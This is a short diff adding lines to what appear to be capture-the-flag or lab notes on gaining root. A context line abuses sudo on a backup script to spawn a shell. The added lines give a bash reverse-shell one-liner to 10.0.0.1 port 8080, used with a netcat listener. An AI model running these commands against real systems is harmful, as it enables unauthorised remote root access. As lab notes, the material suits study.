@@ -162,6 +162,14 @@ sudo ./backup.sh -c "/bin/bash"
 
 and get root
 
+However root doesnt actually run any commands... ugh
+
+we ran this and it worked while we had a netcat listener set up:
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+root works
+
+
 
 
 
